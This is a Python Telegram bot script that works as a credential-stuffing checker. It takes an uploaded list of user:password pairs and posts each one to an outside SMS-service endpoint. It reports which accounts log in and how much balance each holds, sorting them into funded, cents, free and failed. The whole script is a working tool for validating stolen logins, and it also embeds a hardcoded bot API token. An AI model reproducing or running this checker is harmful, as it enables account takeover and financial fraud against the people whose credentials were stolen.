import telebot,time,requests
from telebot import types
#——————————————————————#
session = requests.session()
is_checking = False
#——————————————————————#
bot = telebot.TeleBot('6047075637:AAGV0Q3whE2suNgBKMtv-VROyxfnGOhNERw')
#——————————————————————#
@bot.message_handler(commands=['start'])
def start(message):
	global is_checking
	is_checking = True
	chat_id = message.chat.id
	bot.send_message(message.chat.id, "Welcome! Send me the file.")
#——————————————————————#
	@bot.message_handler(content_types=['document'])
	def handle_document(message):
		global is_checking
		file_info = bot.get_file(message.document.file_id)
		downloaded_file = bot.download_file(file_info.file_path)
		file_content = downloaded_file.decode('utf-8')
		lines = file_content.strip().split('\n')
		if not is_checking:return
#——————————————————————#
		msg = bot.send_message(chat_id=chat_id,text="The Checking Started, Wait ⌛")
#——————————————————————#
		work = 0
		cents = 0
		fucked = 0
		free = 0
#——————————————————————#
		for line in lines:
			if not is_checking:return
			line = line.strip()
			try:
				user, pas = line.split(':')
				email = f"{user}:{pas}"
				email1 = f"{user} • {pas}"	
#——————————————————————#
				url = f"https://alflim.org/mos999/sms.php?email={user}&pass={pas}"
				
				response = session.post(url)
#——————————————————————#
				if '"status": true' in response.text:
					balance = response.json()['Balance']
			
					dollars = float(balance)
#——————————————————————#
					if balance == '0.00':
						print(f'{email}> Working For Free')
						free += 0
					if len(balance) == 5:
						bot.send_message(chat_id, f'{email}>Working but have cents: {dollars:.2f}$')
						cents += 1
					else:
						bot.send_message(chat_id, f'{email}> Have dollars: {dollars:.2f}$')
						work += 1	
#——————————————————————#
				else:fucked += 1	
#——————————————————————#
				reply_markup = create_reply_markup(email1,work,cents,fucked,len(lines),free)
				bot.edit_message_text(
	chat_id=chat_id,
	message_id=msg.message_id,
	text="Checking in progress...",
	reply_markup=reply_markup)
#——————————————————————#
			except ValueError:print("fuck")
			except telebot.apihelper.ApiTelegramException as e:
				retry_after_seconds = (e.result_json)
				print(retry_after_seconds)
				timetowait = (retry_after_seconds['parameters']['retry_after'])
				time.sleep(timetowait)
		is_checking = False
		return
	return 
#——————————————————————#
def create_reply_markup(line, work, cents, fucked, All,free):
    
    markup = types.InlineKeyboardMarkup()
    
    email_button = types.InlineKeyboardButton(text=f"⌜ • {line} • ⌝", callback_data='none')
    work_button = types.InlineKeyboardButton(text=f"⌯ H-Balance: {work}", callback_data='none')
    cents_button = types.InlineKeyboardButton(text=f"Cents: {cents}", callback_data='none')
    free_button = types.InlineKeyboardButton(text=f"Free: {free} ⌯", callback_data='none')
    dead_button = types.InlineKeyboardButton(text=f"⌞ • Fucked: {fucked}", callback_data='none')
    all_button = types.InlineKeyboardButton(text=f"All: {All} • ⌟", callback_data='none')
    team_button = types.InlineKeyboardButton(text="Dev Team", url='https://t.me/telemex')
    dev_button = types.InlineKeyboardButton(text="Dev", url='https://t.me/E_2_7')
    
    stop_button = telebot.types.InlineKeyboardButton(text="STOP", callback_data="stop")
    
    markup.add(email_button)
    markup.add(work_button,cents_button,free_button)
    markup.add(dead_button,all_button)
    markup.add(team_button,dev_button)
    markup.add(stop_button)
    return markup
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
		global is_checking
		if call.data == "stop":
			is_checking = False
			bot.answer_callback_query(call.id, text="Checking stopped.")
#——————————————————————#
bot.infinity_polling()
